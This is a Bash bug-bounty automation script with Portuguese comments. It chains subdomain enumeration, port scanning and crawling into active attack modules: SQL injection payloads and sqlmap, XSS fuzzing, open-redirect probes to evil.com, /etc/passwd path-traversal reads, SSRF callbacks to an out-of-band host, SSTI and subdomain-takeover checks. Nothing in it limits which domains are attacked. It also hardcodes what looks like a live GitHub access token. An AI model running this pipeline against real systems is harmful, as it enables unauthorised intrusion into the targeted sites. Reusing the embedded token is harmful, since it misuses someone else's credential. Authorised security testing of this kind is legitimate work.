#!/bin/bash

echo "[+]-------------------Start Enum Subs-------------------[+]"
#####################
#                   #
# RECON DOS SUBS    #
#                   #
#####################
echo "[+]-------------------Enum Curl-------------------[+]"
while read url; do
    curl -s "https://jldc.me/anubis/subdomains/$url" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | tee jldc_"$url"
    curl -s https://dns.bufferover.run/dns?q=.$url | jq -r .FDNS_A[] | sed -s 's/,/\n/g' | tee bufferover_"$url"
    curl -s "https://rapiddns.io/subdomain/$url?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u | tee rapiddns_"$url"
    curl -s "https://riddler.io/search/exportcsv?q=pld:$url" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u | tee riddler_"$url"
    curl -s "https://www.virustotal.com/ui/domains/$url/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u | tee virustotal_"$url"
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.$url/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u | tee archive_"$url"
    curl -s https://sonar.omnisint.io/subdomains/$url | grep -oE "[a-zA-Z0-9._-]+\.$url" | sort -u | tee sonar_"$url"
    curl -s -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2F$url" | grep -oE "[a-zA-Z0-9._-]+\.$url" | sort -u | tee synapsint_"$url"

    # Enum Tools

    echo "[+]-------------------Haktrails-------------------[+]"

    echo $url | haktrails subdomains | tee haktrails_"$url"

    echo "[+]-------------------Assetfinder-------------------[+]"

    assetfinder -subs-only $url | tee assetfinder_"$url"

    echo "[+]-------------------Subfinder-------------------[+]"

    subfinder -d $url -all -o subfinder_"$url"

    echo "[+]-------------------Amass Passive-------------------[+]"

    amass enum -norecursive -passive -d $url -o amass1_"$url"

    echo "[+]-------------------Amass Brute-------------------[+]"

    amass enum -norecursive -brute -d $url -o amass2_"$url"

    echo "[+]-------------------Amass With Wordlist-------------------[+]"

    amass enum -active -d $url -brute -w ~/wordlists/Discovery/DNS/subdomains-top1million-110000.txt -o amass3_"$url"

    echo "[+]-------------------Chaos Brute-------------------[+]"

    chaos -d $url -silent -o chaos_"$url"

    echo "[+]-------------------Github Subdomains-------------------[+]"

    python3 ~/Tools/github-search/github-subdomains.py -t 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 -d $url | tee github_"$url"

    echo "[+]-------------------Findomain-------------------[+]"

    findomain -t $url -q | tee findomain_"$url"

    echo "[+]-------------------Sublist3r-------------------[+]"

    python3 ~/Tools/Sublist3r/sublist3r.py -d $url | tee sublist3r_"$url"

    echo "[+]-------------------Knockpy-------------------[+]"

    python3 ~/Tools/knock/knockpy.py $url | cut -d "," -f1  | tr "]" " "| tr '"' " " | tr "[" " "  | cut -d " " -f6 | sed '1d' >> knock_"$url"

    #Remove Extra Lines
    sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"; sed -i 1,2d knock_"$url"

done < "$url"

#############################
#                           #
# JUNTA TODOS RESULTADOS    #
#                           #
#############################

echo "[+]-------------------Join All-------------------[+]"

cat jldc_* bufferover_* rapiddns_* riddler_* virustotal_* archive_* sonar_* synapsint_* haktrails_* assetfinder_* subfinder_* amass1_* amass2_* amass3_* chaos_* github_* findomain_* sublist3r_* knock_* | anew allSubs

#############################
#                           #
# REMOVE ARQUIVOS EXTRAS    #
#                           #
#############################

echo "[+]-------------------Removing Files-------------------[+]"

rm -rf jldc_* bufferover_* rapiddns_* riddler_* virustotal_* archive_* sonar_* synapsint_* haktrails_* assetfinder_* subfinder_* amass1_* amass2_* amass3_* chaos_* github_* findomain_* sublist3r_* knock_*

##############
#            #
# PEGA IP    #
#            #
##############

cat allSubs | dnsx -resp-only -a -silent -t 400 | tee dnsx

######################################
#                                    #
# CHECA PORTAS E VALIDA COM HTTPX    #
#                                    #
######################################

echo "[+]-------------------Naabu Alive Subs-------------------[+]"

cat allSubs | naabu -silent -c 400 -rate 2000 -p - | tee naabu
cat dnsx | naabu -silent -c 400 -rate 2000 -p - | tee ipNaabu

echo "[+]-------------------Httpx Alive Subs-------------------[+]"

cat ipNaabu | httpx -silent -t 400 -rl 300 -o aliveIpSubs
cat naabu | httpx -silent -t 400 -rl 300 -o aliveSubs

##########################################################################
#                                                                        #
# NUCLEI ENUMERAR SWAGGER E SCAN GERAL TANTO NOS IPS QUANTOS NOS SUBS    #
#                                                                        #
##########################################################################

echo "[+]-------------------Starting Nuclei Module-------------------[+]"

cat aliveIpSubs | nuclei -etags ssl,netlify -severity low,medium,high,critical -t ~/nuclei-templates/ -o nucleiIps | notify
cat aliveSubs | nuclei -etags ssl,netlify -severity low,medium,high,critical -t ~/nuclei-templates/ -o nuclei | notify

echo "[+]-------------------Swagger Nuclei Module-------------------[+]"

cat aliveSubs | nuclei -tags swagger -t ~/nuclei-templates -o swagger | notify

#########################
#                       #
# SUBDOMAIN TAKEOVER    #
#                       #
#########################

subjack -w aliveSubs -a -t 400 -o subjackTakeover
subzy run --targets aliveSubs --concurrency 400 --hide_fails | tee subzyTakeover

#######################################################
#                                                     #
#                                                     #
#                                                     #
#                                                     #
# ENUMERAÇÃO DE ENDPOINTS VISANDO PEGAR PARÂMETROS    #
#                                                     #
#                                                     #
#                                                     #
#                                                     #
#######################################################

echo "[+]-------------------Starting Cache Module-------------------[+]"

cat aliveSubs | waybackurls | uro | tee waybackurls
cat aliveSubs | gau --blacklist md,jpg,jpeg,gif,css,tif,tiff,png,ttf,txt,woff,woff2,ico,pdf,php,js | uro | tee gau
cat aliveSubs | gauplus -b md,jpg,jpeg,gif,css,tif,tiff,png,ttf,txt,woff,woff2,ico,pdf,php,js -random-agent | uro | tee gauplus

echo "[+]-------------------Starting Crawler Module-------------------[+]"

cat aliveSubs | hakrawler | uro | tee hakrawler
katana -list aliveSubs -d 15 -silent -f qurl | uro | tee katana
arjun -i aliveSubs -oT arjun1
arjun -i aliveSubs -m POST -oT arjun2
xargs -a aliveSubs -I@ bash -c 'python3 ~/Tools/ParamSpider/paramspider.py -d @ --level high -e md,jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,php,js,txt' | uro | tee paramspider

#############################
#                           #
# JUNTA TODOS RESULTADOS    #
#                           #
#############################

echo "[+]-------------------Join All Endpoints-------------------[+]"

cat waybackurls gau gauplus hakrawler katana arjun1 arjun2 paramspider | uro | grep -E '^(?=.*[?&])\S+$' | tee endpoints

##################################
#                                #
# VALIDA RESULTADOS COM HTTPX    #
#                                #
##################################

echo "[+]-------------------Validate Endpoints-------------------[+]"

cat endpoints | httpx -silent | anew aliveEndpoints

#######################
#                     #
# ENUMERAÇÃO DE JS    #
#                     #
#######################

echo "[+]-------------------Enum JS Module-------------------[+]"

echo "[+]-------------------Cache JS Module-------------------[+]"

cat aliveSubs | gau -subs | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)' | tee gau
cat aliveSubs | waybackurls | grep -E '\.json(?:onp?)?$' | anew waybackurls1
cat aliveSubs | waybackurls | grep -iE '\.js'| grep -iEv '(\.jsp)' | tee waybackurls2

echo "[+]-------------------Crawler JS Module-------------------[+]"

cat aliveSubs | getJS --complete | anew getJS
cat aliveSubs | katana -d 15 -silent -em js,jsp,json -o katana
cat aliveSubs | gospider --js | grep -E '\.js(?:onp?)?$' | awk '{print $4}' | tr -d '[]' | anew gospider
cat aliveSubs | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{{print $3}}' | grep -E '\.js(?:onp?)?$' | anew hakrawler1
cat aliveSubs | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawler2'

echo "[+]-------------------Fuzz JS Module-------------------[+]"

cat aliveSubs | xargs -I@ sh -c 'python3 ~/Tools/dirsearch/dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e json,js,jsp' | tee dirsearch

#############################
#                           #
# JUNTA TODOS RESULTADOS    #
#                           #
#############################

echo "[+]-------------------Join All-------------------[+]"

cat getJS katana gau waybackurls1 waybackurls2 gospider hakrawler1 hakrawler2 dirsearch | anew allJS

####################
#                  #
# SEPARA SÓ .JS    #
#                  #
####################

echo "[+]-------------------Just JS-------------------[+]"

cat getJS katana gau waybackurls1 waybackurls2 gospider hakrawler1 hakrawler2 dirsearch | grep -E '\.js(?:onp?)?$' | sort -u | tee justJS

######################################
#                                    #
# VALIDA RESULTADOS COM ANTI-BURL    #
#                                    #
######################################

echo "[+]-------------------Validating JS-------------------[+]"

cat allJS | anti-burl | anew js200

cat justJS | anti-burl | anew aliveJustJS

#############################
#                           #
# REMOVE ARQUIVOS EXTRAS    #
#                           #
#############################

echo "[+]-------------------Removing Files-------------------[+]"

rm -rf getJS katana gau waybackurls1 waybackurls2 gospider hakrawler1 hakrawler2 dirsearch

##################
#                #
# RECON DO JS    #
#                #
##################

echo "[+]-------------------Start JS Analysis-------------------[+]"

####################
#                  #
# ANÁLISE DE JS    #
#                  #
####################

echo "[+]-------------------LinkFinder, Collector and Secret Finder-------------------[+]"

xargs -a aliveJustJS -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 ~/Tools/linkfinder.py -i @ -o cli"; cat aliveJustJS | python3 ~/Tools/collector.py outputS; rush -i output/urls.txt 'python3 ~/Tools/SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'

echo 'USE JSSCANER https://github.com/0x240x23elu/JSScanner' | notify

#########################
#                       #
# EXTRAIR URLS DO JS    #
#                       #
#########################

echo "[+]-------------------Extract Urls-------------------[+]"

xargs -a aliveJustJS -n 2 -I@ bash -c "echo -e '\n[URL]: @\n; python3 ~/Tools/LinkFinder/linkfinder.py -i @ -o cli" | tee saida; cat saida | grep -o 'https\?://[^/]*' | tee linkfinder
python3 ~/my-scripts/urlJSFinder.py aliveJustJS

#############################
#                           #
# JUNTA TODOS RESULTADOS    #
#                           #
#############################

echo "[+]-------------------Join All-------------------[+]"

cat urlJS.txt linkfinder | anew jsUrls

##################################################
#                                                #
# COMPARA SUBS DO PRIMEIRO RECON COM OS NOVOS    #
#                                                #
##################################################

echo "[+]-------------------Diff With The Old Subs-------------------[+]"

diff --new-line-format="" --unchanged-line-format="" allSubs jsUrls | tee allJsUrls

##############
#            #
# PEGA IP    #
#            #
##############

cat allJsUrls | dnsx -resp-only -a -silent | tee dnsxJS

######################################
#                                    #
# CHECA PORTAS E VALIDA COM HTTPX    #
#                                    #
######################################

echo "[+]-------------------Naabu Subs-------------------[+]"--------------------------------------------------------------------------ADICIONAR DNSX

cat dnsxJS | naabu -silent -p - | tee ipJsNaabu
cat allJsUrls | naabu -silent -p - | tee jsNaabu

echo "[+]-------------------Httpx Subs-------------------[+]"

cat ipJsNaabu | httpx -silent | tee ipAliveNew
cat jsNaabu | httpx -silent | tee aliveNewSubs

##########################################################################
#                                                                        #
# NUCLEI ENUMERAR SWAGGER E SCAN GERAL TANTO NOS IPS QUANTOS NOS SUBS    #
#                                                                        #
##########################################################################

echo "[+]-------------------Starting Nuclei Module-------------------[+]"

cat ipAliveNew | nuclei -etags ssl,netlify -severity low,medium,high,critical -t ~/nuclei-templates/ -o ipNucleiNewSubs | notify
cat aliveNewSubs | nuclei -etags ssl,netlify -severity low,medium,high,critical -t ~/nuclei-templates/ -o nucleiNewSubs | notify

echo "[+]-------------------Swagger Nuclei Module-------------------[+]"

cat aliveNewSubs | nuclei -tags swagger -t ~/nuclei-templates -o swaggerNewSubs | notify

#######################################################
#                                                     #
# ENUMERAÇÃO DE ENDPOINTS VISANDO PEGAR PARÂMETROS    #
#                                                     #
#######################################################

echo "[+]-------------------Starting Cache Module-------------------[+]"

cat aliveNewSubs | waybackurls | uro | tee waybackurlsNewSubs
cat aliveNewSubs | gau --blacklist md,jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,php,js | uro | tee gauNewSubs
cat aliveNewSubs | gauplus -b md,jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,php,js -random-agent | uro | tee gauplusNewSubs

echo "[+]-------------------Starting Crawler Module-------------------[+]"

cat aliveNewSubs | hakrawler | uro | tee hakrawlerNewSubs
katana -list aliveNewSubs -d 15 -silent -f qurl | uro | tee katanaNewSubs
arjun -i aliveNewSubs -oT arjun1NewSubs
arjun -i aliveNewSubs -m POST -oT arjun2NewSubs
xargs -a aliveNewSubs -I@ bash -c 'python3 ~/Tools/ParamSpider -d @ --level high -e md,jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,php,js' | uro | tee paramspiderNewSubs

#############################
#                           #
# JUNTA TODOS RESULTADOS    #
#                           #
#############################

echo "[+]-------------------Join All Endpoints-------------------[+]"

cat waybackurlsNewSubs gauNewSubs gauplusNewSubs hakrawlerNewSubs katanaNewSubs arjun1NewSubs arjun2NewSubs paramspiderNewSubs | uro | grep -E '^(?=.*[?&])\S+$' | tee endpointsNewSubs

##################################
#                                #
# VALIDA RESULTADOS COM HTTPX    #
#                                #
##################################

echo "[+]-------------------Validate Endpoints-------------------[+]"

cat endpointsNewSubs | httpx -silent | anew aliveNewEndpoints

echo "[+]-------------------Extract Endpoints on JS File-------------------[+]"

# ADICIONAR
#xargs -a teste -I@ bash -c 'curl -s @ | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | grep = | grep vulnweb | sort -u'

####################
#                  #
# MÓDULO DE XSS    #
#                  #
####################

echo "[+]-------------------XSS Module-------------------[+]"

##################################
#                                #
# CHECA PARÂMETROS REFLETIDOS    #
#                                #
##################################

echo "[+]-------------------Checking Reflected Parameters-------------------[+]"

cat aliveEndpoints | Gxss -c 100 -p Xss -o reflectedParams

echo "[+]-------------------Starting Dalfox-------------------[+]"

cat reflectedParams | dalfox pipe --skip-bav | tee dalfox; echo "Dalfox Finalizado" | notify

echo "[+]-------------------Starting Nuclei Fuzzing Templates-------------------[+]"

cat aliveEndpoints | nuclei -t ~/fuzzing-templates/xss -o fuzzingTemplates | notify

#ADICIONAR ONELINERS XSS

echo "[+]-------------------Sqli Module-------------------[+]"

cat aliveEndpoints | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 | tee sqlmap
cat aliveEndpoints | gf sqli | grep "=" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" >> sqlSyntaxError
rm -rf sqli

echo "[+]-------------------Open Redirect Module-------------------[+]"

cat aliveEndpoints | gf redirect | grep "=" | qsreplace FUZZ | tee openRedirectFuzz; python3 ~/Tools/OpenRedireX/ openredirex.py -l openRedirectFuzz -p ~/Wordlists/payloadsOpenRedirect.txt --keyword FUZZ | tee openRedireX
cat aliveEndpoints | gf redirect | httpx -silent -path "//evil.com/..;/css" -mc 302 -status-code -match-string "Location: //evil.com/..;/css" | tee openRedirectHttpx
cat aliveEndpoints | gf redirect | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi' | tee openRedirectRush
cat aliveEndpoints | gf redirect | rush 'if curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "HTTP/1.1 \|HTTP/2" | cut -d" " -f2 | grep -q "301\|302\|307";then domain=`curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "Location\:\|location\:" | cut -d" " -f2 | cut -d"/" -f1-3 | sed "s/^http\(\|s\):\/\///g" | sed "s/\s*$//"`; path=`echo "{}" | cut -d"/" -f4-20`; if echo "$path" | grep -q "$domain"; then echo "Reflection Found on Location headers from URL '{}'";fi;fi' | tee openRedirectLocationHeader

echo "[+]-------------------LFI Module-------------------[+]"

cat aliveEndpoints | gf lfi | qsreplace ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee lfiCurl
ffuf -c -w aliveEndpoints -u FUZZ////////../../../../../etc/passwd -mr "root:x" | tee lfiFfuf

echo "[+]-------------------SSRF Module-------------------[+]"

cat aliveEndpoints | gf ssrf | grep "=" | qsreplace FUZZ | tee ssrfEndpoints; cat ssrfEndpoints | grep FUZZ | qsreplace http://cg9qkyf2vtc0000b9vqgger54ycyyyyyb.oast.fun | httpx -silent | tee ssrfHttpx
rm -rf ssrfEndpoints

echo "[+]-------------------SSTI Module-------------------[+]"

cat aliveEndpoints | gf lfi | tee sstiEndpoints; xargs -a sstiEndpoints -I@ bash -c 'python3 ~/Tools/SSTImap/sstimap.py -u @' | tee sstiMap
rm -rf sstiEndpoints

#In future need tests
#cat endpoints | qsreplace "abc{{9*9}}" > fuzz.txt; ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/

# Used Tools and URLS

# - Jldc
# - Certsh
# - Bufferover
# - Riddle
# - VirusTotal
# - Archive
# - Sonar
# - Synapsint
# - Haktrails
# - Assetfinder
# - Subfinder
# - Amass
# - Chaos
# - Github
# - Findomain
# - Sublist3r
# - Knockpy

#curl -s "https://crt.sh/?q=%25.$url&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | tee certsh1
#curl -s "https://crt.sh/?q=%25.%25.$url&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | tee certsh2
#curl -s "https://crt.sh/?q=%25.%25.%25.$url&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | tee certsh3
#curl -s "https://crt.sh/?q=%25.%25.%25.%25.$url&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | tee certsh4